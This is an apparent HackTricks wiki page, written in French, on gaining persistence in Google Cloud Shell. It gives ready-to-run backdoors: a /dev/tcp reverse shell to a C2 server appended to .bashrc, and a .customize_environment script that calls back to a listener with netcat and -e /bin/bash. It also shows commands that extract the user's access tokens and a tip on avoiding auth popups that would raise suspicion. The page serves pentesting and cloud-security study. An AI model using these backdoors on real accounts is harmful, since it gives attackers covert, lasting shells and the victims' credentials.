# GCP - Cloud Shell Persistance

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell

Pour plus d'informations, consultez :

{{#ref}}
../gcp-services/gcp-cloud-shell-enum.md
{{#endref}}

### Persistent Backdoor

[**Google Cloud Shell**](https://cloud.google.com/shell/) vous fournit un accès en ligne de commande à vos ressources cloud directement depuis votre navigateur sans aucun coût associé.

Vous pouvez accéder au Cloud Shell de Google depuis la **console web** ou en exécutant **`gcloud cloud-shell ssh`**.

Cette console présente des capacités intéressantes pour les attaquants :

1. **Any Google user with access to Google Cloud** — Tout utilisateur Google ayant accès à Google Cloud a accès à une instance Cloud Shell entièrement authentifiée (Les Service Accounts peuvent le faire, même en étant Owners de l'org).
2. L'instance conservera son répertoire home **pendant au moins 120 jours** si aucune activité n'est détectée.
3. Il n'existe **aucune capacité pour une organisation de surveiller** l'activité de cette instance.

Cela signifie essentiellement qu'un attaquant peut placer un backdoor dans le répertoire home de l'utilisateur et tant que l'utilisateur se connecte au GC Shell au moins tous les 120 jours, le backdoor survivra et l'attaquant obtiendra un shell à chaque exécution simplement en faisant :

<details>

<summary>Ajouter une reverse shell dans .bashrc</summary>
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
</details>

Il y a un autre fichier dans le dossier home appelé **`.customize_environment`** qui, s'il existe, va être **exécuté à chaque fois** que l'utilisateur accède au **cloud shell** (comme dans la technique précédente). Il suffit d'insérer le backdoor précédent ou un backdoor similaire comme suit pour maintenir la persistance tant que l'utilisateur utilise "fréquemment" le cloud shell :

<details>

<summary>Créer un backdoor .customize_environment</summary>
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
</details>

> [!WARNING]
> Il est important de noter que la **première fois qu'une action nécessitant une authentification est effectuée**, une fenêtre contextuelle d'autorisation apparaît dans le navigateur de l'utilisateur. Cette fenêtre doit être acceptée avant que la commande puisse s'exécuter. Si une fenêtre contextuelle inattendue apparaît, cela pourrait éveiller les soupçons et compromettre potentiellement la méthode de persistence utilisée.

Ceci est la fenêtre contextuelle résultant de l'exécution de `gcloud projects list` depuis le cloud shell (en tant qu'attaquant) vue dans la session utilisateur du navigateur :

<figure><img src="../../../images/image (10).png" alt=""><figcaption></figcaption></figure>

Cependant, si l'utilisateur a activement utilisé le cloudshell, la fenêtre contextuelle n'apparaîtra pas et vous pouvez **récupérer les tokens de l'utilisateur avec** :

<details>

<summary>Récupérer les access tokens depuis Cloud Shell</summary>
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
</details>

#### Comment la connexion SSH est établie

Essentiellement, ces 3 appels d'API sont utilisés :

- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (vous permettra d'ajouter la clé publique que vous avez créée localement)
- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (démarrera l'instance)
- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (vous indiquera l'IP du Google Cloud Shell)

Mais vous pouvez trouver plus d'informations dans [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)

## Références

- [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
- [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
- [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

{{#include ../../../banners/hacktricks-training.md}}
